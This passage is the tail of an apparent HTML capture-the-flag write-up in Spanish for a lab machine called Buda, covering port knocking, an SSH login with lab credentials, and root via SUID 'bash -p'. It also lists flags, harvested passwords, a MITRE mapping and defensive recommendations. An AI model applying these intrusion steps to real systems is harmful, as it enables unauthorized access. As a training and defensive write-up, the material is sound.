+[+] Knocking on port TARGET:9467
+[+] Knocking on port TARGET:1739
+******************************************************
+
+$ nmap -p 22 TARGET
+PORT   STATE SERVICE
+22/tcp open  ssh     ← ¡ABIERTO!</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué nos dice?</strong>
+      <p>La secuencia correcta es <strong>8745 → 9467 → 1739</strong>. Después de enviar los paquetes en este orden, <code>knockd</code> elimina la regla de iptables que bloqueaba el puerto 22.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 10 — SSH + User Flag</div>
+    <h3>Acceso como yolanda</h3>
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">ssh</span>
+        <span class="param"> yolanda@192.168.X.X</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note">Password: <code>y@lAnd361!</code></div>
+      </div>
+    </div>
+    <div class="output-box">
+      <pre>-bash-5.1$ whoami
+yolanda
+
+-bash-5.1$ cat /home/yolanda/user.txt
+<span style="color:var(--green);font-weight:700;">3ed94f1e1e1b6af4c5cd1d5e1ab35ce6</span>  ✓</pre>
+    </div>
+    <div class="flag-box">
+      <div class="flag-label">🏁 User Flag</div>
+      <div class="flag-value">3ed94f1e1e1b6af4c5cd1d5e1ab35ce6</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ 6. ESCALADA DE PRIVILEGIOS ═══ -->
+<div class="section" id="privesc">
+  <div class="section-title">
+    <span class="section-number">6</span>
+    <h2>Escalada de Privilegios — SUID Bash</h2>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 11 — Enumeración SUID</div>
+    <h3>Búsqueda de binarios con bit SUID</h3>
+    <div class="why-box">
+      <strong>¿Por qué buscar SUID primero?</strong>
+      <p>El bit SUID permite ejecutar un binario con los permisos del propietario. Si <code>root</code> es propietario de un binario con SUID, ese binario corre como root sin importar quién lo ejecute. Es uno de los vectores de privesc más directos.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">find</span>
+        <span class="param"> /</span>
+        <span class="flag-opt"> -perm</span>
+        <span class="param"> -u=s</span>
+        <span class="flag-opt"> -type</span>
+        <span class="param"> f</span>
+        <span class="param"> 2>/dev/null</span>
+      </div>
+    </div>
+    <div class="output-box">
+      <pre>/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/fusermount3
+/usr/bin/chfn
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/su
+/usr/bin/pkexec
+/usr/bin/gpasswd
+<span style="color:var(--red);font-weight:bold;">/usr/bin/bash    ← ANÓMALO!</span>
+/usr/bin/passwd</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué nos dice?</strong>
+      <p><code>/usr/bin/bash</code> tiene el bit SUID activado. Esto es <strong>altamente inusual</strong> — bash con SUID jamás debería existir en producción. GTFOBins documenta cómo explotar esto: <code>bash -p</code> activa el modo privilegiado que preserva el UID efectivo del propietario (root).</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 12 — Root</div>
+    <h3>bash -p → Shell de root</h3>
+    <div class="why-box">
+      <strong>¿Qué hace bash -p?</strong>
+      <p>El flag <code>-p</code> activa el modo "privilegiado" de bash. En modo normal, bash descarta el UID efectivo por seguridad. Con <code>-p</code>, mantiene el UID efectivo = root (gracias al SUID). El resultado es una shell root funcional.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd" style="color:var(--red);font-weight:900;">bash -p</span>
+      </div>
+    </div>
+    <div class="output-box">
+      <pre>bash-5.1# whoami
+root
+
+bash-5.1# cat /root/root.txt
+<span style="color:var(--green);font-weight:700;">88f33d5d82d4e1cd067b52f8fa1323c3</span>  ✓</pre>
+    </div>
+    <div class="flag-box">
+      <div class="flag-label">🏆 Root Flag</div>
+      <div class="flag-value">88f33d5d82d4e1cd067b52f8fa1323c3</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ 7. VULNERABILIDADES ═══ -->
+<div class="section" id="vulns">
+  <div class="section-title">
+    <span class="section-number">7</span>
+    <h2>Vulnerabilidades Encontradas</h2>
+  </div>
+  <table class="data-table">
+    <tr>
+      <th>Vulnerabilidad</th><th>Severidad</th><th>Componente</th><th>CWE</th>
+    </tr>
+    <tr>
+      <td><strong>SQL Injection</strong> — campo username sin sanitizar</td>
+      <td><span class="severity sev-critical">CRÍTICA</span></td>
+      <td>dev.budasec.thl</td>
+      <td>CWE-89</td>
+    </tr>
+    <tr>
+      <td><strong>Credenciales en texto plano</strong> en base de datos MySQL</td>
+      <td><span class="severity sev-high">ALTA</span></td>
+      <td>MySQL / DB buda</td>
+      <td>CWE-256</td>
+    </tr>
+    <tr>
+      <td><strong>Exposición de credenciales</strong> en archivo de auditoría via FTP</td>
+      <td><span class="severity sev-critical">CRÍTICA</span></td>
+      <td>FTP / audit2024</td>
+      <td>CWE-312</td>
+    </tr>
+    <tr>
+      <td><strong>ZIP con contraseña débil</strong></td>
+      <td><span class="severity sev-medium">MEDIA</span></td>
+      <td>documents.zip</td>
+      <td>CWE-521</td>
+    </tr>
+    <tr>
+      <td><strong>Bit SUID en /usr/bin/bash</strong></td>
+      <td><span class="severity sev-critical">CRÍTICA</span></td>
+      <td>Sistema Linux</td>
+      <td>CWE-269</td>
+    </tr>
+  </table>
+</div>
+
+<!-- ═══ 8. MITRE ATT&CK ═══ -->
+<div class="section" id="mitre">
+  <div class="section-title">
+    <span class="section-number">8</span>
+    <h2>MITRE ATT&amp;CK</h2>
+  </div>
+  <table class="mitre-table">
+    <tr><th>Técnica</th><th>ID</th><th>Fase</th></tr>
+    <tr><td>Network Service Discovery</td><td>T1046</td><td>Reconocimiento</td></tr>
+    <tr><td>Exploit Public-Facing Application (SQLi)</td><td>T1190</td><td>Acceso Inicial</td></tr>
+    <tr><td>Unsecured Credentials: Credentials in Files</td><td>T1552.001</td><td>Acceso a Credenciales</td></tr>
+    <tr><td>Valid Accounts</td><td>T1078</td><td>Persistencia</td></tr>
+    <tr><td>Remote Services: SSH</td><td>T1021.004</td><td>Movimiento Lateral</td></tr>
+    <tr><td>Abuse Elevation Control Mechanism</td><td>T1548.001</td><td>Escalada de Privilegios</td></tr>
+    <tr><td>Brute Force: Password Cracking</td><td>T1110.002</td><td>Acceso a Credenciales</td></tr>
+  </table>
+</div>
+
+<!-- ═══ 9. RECOMENDACIONES ═══ -->
+<div class="section" id="recomendaciones">
+  <div class="section-title">
+    <span class="section-number">9</span>
+    <h2>Recomendaciones de Seguridad</h2>
+  </div>
+  <div class="rec-box">
+    <div class="rec-icon">🔒</div>
+    <div>
+      <div class="rec-title">Usar Prepared Statements en todas las queries SQL</div>
+      <div class="rec-desc">Reemplazar concatenación de strings por PDO con parámetros vinculados. El input del usuario nunca debe ser interpretado como código SQL.</div>
+    </div>
+  </div>
+  <div class="rec-box">
+    <div class="rec-icon">🔑</div>
+    <div>
+      <div class="rec-title">Hashear contraseñas con bcrypt/Argon2</div>
+      <div class="rec-desc">Nunca almacenar contraseñas en texto plano. Usar <code>password_hash($pass, PASSWORD_BCRYPT)</code> en PHP.</div>
+    </div>
+  </div>
+  <div class="rec-box">
+    <div class="rec-icon">📄</div>
+    <div>
+      <div class="rec-title">No incluir credenciales en documentos de auditoría</div>
+      <div class="rec-desc">Revisar todos los documentos antes de distribución. Implementar DLP. Los informes nunca deben contener credenciales reales.</div>
+    </div>
+  </div>
+  <div class="rec-box">
+    <div class="rec-icon">🛡️</div>
+    <div>
+      <div class="rec-title">Auditar bits SUID/SGID regularmente</div>
+      <div class="rec-desc">Ejecutar periódicamente: <code>find / -perm -4000 -type f 2>/dev/null</code>. <code>/usr/bin/bash</code> jamás debe tener SUID.</div>
+    </div>
+  </div>
+  <div class="rec-box">
+    <div class="rec-icon">🗜️</div>
+    <div>
+      <div class="rec-title">Cifrado robusto para archivos sensibles</div>
+      <div class="rec-desc">Las contraseñas de ZIP son crackeables. Usar GPG con clave pública o almacenar en secret managers.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ 10. LECCIONES ═══ -->
+<div class="section" id="lecciones">
+  <div class="section-title">
+    <span class="section-number">10</span>
+    <h2>Lecciones Aprendidas</h2>
+  </div>
+  <div class="lessons-grid">
+    <div class="lesson-card attacker">
+      <h4>🗡️ Atacante</h4>
+      <ul>
+        <li>Siempre revisar <code>robots.txt</code> — puede filtrar información del dominio</li>
+        <li>Los puertos filtrados no significan cerrados — port knocking es real</li>
+        <li>sqlmap con <code>--tamper</code> puede bypassear WAFs básicos</li>
+        <li>Los archivos de auditoría son una mina de oro de credenciales</li>
+      </ul>
+    </div>
+    <div class="lesson-card defender">
+      <h4>🛡️ Defensor</h4>
+      <ul>
+        <li>Port knocking no es seguridad real — es oscuridad, no defensa</li>
+        <li>Prepared statements son obligatorios, no opcionales</li>
+        <li>SUID en bash es un error de configuración catastrófico</li>
+        <li>DLP y revisión de documentos antes de publicar</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ 11. GLOSARIO ═══ -->
+<div class="section" id="glosario">
+  <div class="section-title">
+    <span class="section-number">11</span>
+    <h2>Glosario Técnico</h2>
+  </div>
+  <div class="glos-item">
+    <div class="glos-term">Port Knocking</div>
+    <div class="glos-def">Técnica de seguridad que mantiene un puerto invisible/bloqueado hasta que se envían paquetes a una secuencia específica de puertos. <code>knockd</code> es el daemon más común en Linux.</div>
+  </div>
+  <div class="glos-item">
+    <div class="glos-term">SQL Injection (SQLi)</div>
+    <div class="glos-def">Vulnerabilidad donde input malicioso modifica la lógica de una consulta SQL. Puede causar bypass de autenticación, extracción de datos, escritura de archivos o ejecución de comandos.</div>
+  </div>
+  <div class="glos-item">
+    <div class="glos-term">Virtual Host (vhost)</div>
+    <div class="glos-def">Configuración de Apache/Nginx que sirve diferentes sitios desde el mismo servidor IP, diferenciándolos por el header HTTP <code>Host:</code>.</div>
+  </div>
+  <div class="glos-item">
+    <div class="glos-term">SUID (Set User ID)</div>
+    <div class="glos-def">Bit especial de permisos en Linux. Cuando está activo en un ejecutable, el programa corre con el UID del propietario del archivo, no del usuario que lo ejecuta.</div>
+  </div>
+  <div class="glos-item">
+    <div class="glos-term">sqlmap</div>
+    <div class="glos-def">Herramienta open-source que automatiza detección y explotación de SQL Injection. Soporta todos los tipos de inyección y puede dumpear bases de datos completas.</div>
+  </div>
+  <div class="glos-item">
+    <div class="glos-term">ffuf (Fuzz Faster U Fool)</div>
+    <div class="glos-def">Herramienta de fuzzing web escrita en Go. Extremadamente rápida para descubrir rutas, virtual hosts y endpoints ocultos mediante diccionarios.</div>
+  </div>
+  <div class="glos-item">
+    <div class="glos-term">fcrackzip</div>
+    <div class="glos-def">Herramienta para crackear contraseñas de archivos ZIP mediante diccionarios o fuerza bruta.</div>
+  </div>
+  <div class="glos-item">
+    <div class="glos-term">GTFOBins</div>
+    <div class="glos-def">Colección online que documenta cómo explotar binarios Unix legítimos para escalar privilegios, bypassear restricciones o exfiltrar datos.</div>
+  </div>
+</div>
+
+</main>
+
+<!-- ═══ SIDEBAR ═══ -->
+<aside class="sidebar">
+
+  <div class="sidebar-card">
+    <h4>Ficha Técnica</h4>
+    <div class="meta-row"><span class="meta-label">Máquina</span><span class="meta-value">Buda</span></div>
+    <div class="meta-row"><span class="meta-label">Plataforma</span><span class="meta-value">The Hacker Labs</span></div>
+    <div class="meta-row"><span class="meta-label">Dificultad</span><span class="meta-value" style="color:var(--red);">Hard</span></div>
+    <div class="meta-row"><span class="meta-label">OS</span><span class="meta-value">Ubuntu Linux</span></div>
+    <div class="meta-row"><span class="meta-label">IP</span><span class="meta-value">192.168.X.X</span></div>
+    <div class="meta-row"><span class="meta-label">Puertos</span><span class="meta-value">21, 80 (22 filtrado)</span></div>
+    <div class="meta-row"><span class="meta-label">Fecha</span><span class="meta-value">2026-04-10</span></div>
+    <div class="meta-row"><span class="meta-label">Fases</span><span class="meta-value">5</span></div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Herramientas Usadas</h4>
+    <div style="display:flex;flex-direction:column;gap:.4rem;">
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;border-bottom:1px solid var(--border);">
+        <span style="color:var(--accent);font-family:var(--mo);font-size:.75rem;">nmap</span>
+        <span style="color:var(--text-muted);font-size:.75rem;">Port scan + scripts NSE</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;border-bottom:1px solid var(--border);">
+        <span style="color:var(--accent);font-family:var(--mo);font-size:.75rem;">ffuf</span>
+        <span style="color:var(--text-muted);font-size:.75rem;">Virtual host fuzzing</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;border-bottom:1px solid var(--border);">
+        <span style="color:var(--accent);font-family:var(--mo);font-size:.75rem;">sqlmap</span>
+        <span style="color:var(--text-muted);font-size:.75rem;">SQL Injection automática</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;border-bottom:1px solid var(--border);">
+        <span style="color:var(--accent);font-family:var(--mo);font-size:.75rem;">fcrackzip</span>
+        <span style="color:var(--text-muted);font-size:.75rem;">ZIP password crack</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;border-bottom:1px solid var(--border);">
+        <span style="color:var(--accent);font-family:var(--mo);font-size:.75rem;">KnockIt</span>
+        <span style="color:var(--text-muted);font-size:.75rem;">Port knock bruteforce</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;">
+        <span style="color:var(--accent);font-family:var(--mo);font-size:.75rem;">GTFOBins</span>
+        <span style="color:var(--text-muted);font-size:.75rem;">SUID bash exploit ref</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Tabla de Contenidos</h4>
+    <a class="toc-link" href="#descripcion"><span class="toc-num">1</span>Descripción</a>
+    <a class="toc-link" href="#reconocimiento"><span class="toc-num">2</span>Reconocimiento</a>
+    <a class="toc-link" href="#explotacion"><span class="toc-num">3</span>Explotación Web</a>
+    <a class="toc-link" href="#ftp"><span class="toc-num">4</span>FTP + ZIP + Creds</a>
+    <a class="toc-link" href="#knocking"><span class="toc-num">5</span>Port Knocking + SSH</a>
+    <a class="toc-link" href="#privesc"><span class="toc-num">6</span>Escalada de Privilegios</a>
+    <a class="toc-link" href="#vulns"><span class="toc-num">7</span>Vulnerabilidades</a>
+    <a class="toc-link" href="#mitre"><span class="toc-num">8</span>MITRE ATT&amp;CK</a>
+    <a class="toc-link" href="#recomendaciones"><span class="toc-num">9</span>Recomendaciones</a>
+    <a class="toc-link" href="#lecciones"><span class="toc-num">10</span>Lecciones</a>
+    <a class="toc-link" href="#glosario"><span class="toc-num">11</span>Glosario</a>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>MITRE ATT&amp;CK</h4>
+    <span class="mitre-tag">T1046</span>
+    <span class="mitre-tag">T1190</span>
+    <span class="mitre-tag">T1552.001</span>
+    <span class="mitre-tag">T1078</span>
+    <span class="mitre-tag">T1021.004</span>
+    <span class="mitre-tag">T1548.001</span>
+    <span class="mitre-tag">T1110.002</span>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Credenciales Obtenidas</h4>
+    <div style="background:#050810;border-radius:8px;padding:.75rem 1rem;font-family:var(--mo);font-size:.75rem;margin-bottom:.5rem;">
+      <div style="color:var(--text-muted);margin-bottom:.25rem;"># FTP</div>
+      <div><span style="color:var(--purple);">ftpuser</span><span style="color:var(--text-dim);">:</span><span style="color:var(--yellow);">ftpu@sr123p@@s!</span></div>
+    </div>
+    <div style="background:#050810;border-radius:8px;padding:.75rem 1rem;font-family:var(--mo);font-size:.75rem;margin-bottom:.5rem;">
+      <div style="color:var(--text-muted);margin-bottom:.25rem;"># ZIP password</div>
+      <div><span style="color:var(--yellow);">manuelito</span></div>
+    </div>
+    <div style="background:#050810;border-radius:8px;padding:.75rem 1rem;font-family:var(--mo);font-size:.75rem;margin-bottom:.5rem;">
+      <div style="color:var(--text-muted);margin-bottom:.25rem;"># SSH (yolanda)</div>
+      <div><span style="color:var(--purple);">yolanda</span><span style="color:var(--text-dim);">:</span><span style="color:var(--yellow);">y@lAnd361!</span></div>
+    </div>
+    <div style="background:#050810;border-radius:8px;padding:.75rem 1rem;font-family:var(--mo);font-size:.75rem;">
+      <div style="color:var(--text-muted);margin-bottom:.25rem;"># DB admin</div>
+      <div><span style="color:var(--purple);">admin</span><span style="color:var(--text-dim);">:</span><span style="color:var(--yellow);">admin123</span></div>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Flags</h4>
+    <div style="background:rgba(0,232,122,.08);border:1px solid rgba(0,232,122,.2);border-radius:8px;padding:.9rem;text-align:center;margin-bottom:.5rem;">
+      <div style="font-size:.65rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;">🏁 User Flag</div>
+      <div style="font-family:var(--mo);font-size:.72rem;color:var(--accent);word-break:break-all;font-weight:700;">3ed94f1e1e1b6af4c5cd1d5e1ab35ce6</div>
+    </div>
+    <div style="background:rgba(0,232,122,.08);border:1px solid rgba(0,232,122,.2);border-radius:8px;padding:.9rem;text-align:center;">
+      <div style="font-size:.65rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;">🏆 Root Flag</div>
+      <div style="font-family:var(--mo);font-size:.72rem;color:var(--accent);word-break:break-all;font-weight:700;">88f33d5d82d4e1cd067b52f8fa1323c3</div>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Cadena de Ataque</h4>
+    <div style="display:flex;flex-direction:column;gap:.35rem;font-size:.75rem;">
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--blue);color:var(--text-dim);font-family:var(--mo);">1. Nmap → FTP + HTTP, SSH filtrado</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--blue);color:var(--text-dim);font-family:var(--mo);">2. robots.txt → budasec.thl</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--cyan);color:var(--text-dim);font-family:var(--mo);">3. ffuf → dev.budasec.thl</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--orange);color:var(--text-dim);font-family:var(--mo);">4. SQLi → dump buda.users</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--yellow);color:var(--text-dim);font-family:var(--mo);">5. FTP ftpuser → knock + ZIP</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--yellow);color:var(--text-dim);font-family:var(--mo);">6. fcrackzip → manuelito</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--purple);color:var(--text-dim);font-family:var(--mo);">7. audit2024 → yolanda creds</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--purple);color:var(--text-dim);font-family:var(--mo);">8. KnockIt → SSH abierto</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--accent);color:var(--text-dim);font-family:var(--mo);">9. SSH yolanda → user.txt ✓</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--red);color:var(--accent);font-family:var(--mo);font-weight:700;">10. SUID bash -p → ROOT ✅</div>
+    </div>
+  </div>
+
+</aside>
+</div>
+
+<!-- ═══ FOOTER ═══ -->
+<footer style="background:var(--bg2);border-top:1px solid var(--border);padding:1.5rem;text-align:center;margin-top:3rem;">
+  <p style="color:var(--text-muted);font-size:.82rem;">The Hacker Labs · Buda · Hard · Linux · FTP 21 + HTTP 80 + SSH 22 (knock) · 2026-04-10</p>
+  <p style="color:var(--text-muted);font-size:.78rem;margin-top:.35rem;">Reporte generado por <span style="color:var(--accent);">kali</span> · Cadena: vhost → SQLi → FTP → ZIP crack → port knock → SSH → SUID bash → root</p>
+</footer>
+
+<script src="https://unpkg.com/three@0.160.0/build/three.min.js"></script>
+<script>
+(function(){
+  var c=document.getElementById('heroOrb');if(!c)return;
+  var r=new THREE.WebGLRenderer({canvas:c,antialias:true,alpha:true});
+  r.setPixelRatio(Math.min(devicePixelRatio,2));r.setSize(260,260,false);
+  var s=new THREE.Scene(),cam=new THREE.PerspectiveCamera(58,1,0.1,100);cam.position.z=7.4;
+  var cfg=[[1.45,3,0.06],[2.1,1,0.03],[2.75,1,0.018]];
+  var sp=cfg.map(function(v){var m=new THREE.Mesh(new THREE.IcosahedronGeometry(v[0],v[1]),new THREE.MeshBasicMaterial({color:0x00e87a,wireframe:true,transparent:true,opacity:v[2]}));s.add(m);return m;});
+  var t=0;(function a(){requestAnimationFrame(a);t+=0.012;sp[0].rotation.y=t*0.35;sp[0].rotation.x=t*0.18;sp[1].rotation.y=-t*0.25;sp[1].rotation.z=t*0.15;sp[2].rotation.y=t*0.15;sp[2].rotation.z=-t*0.1;r.render(s,cam);})();
+})();
+</script>
+
+</body>
+</html>
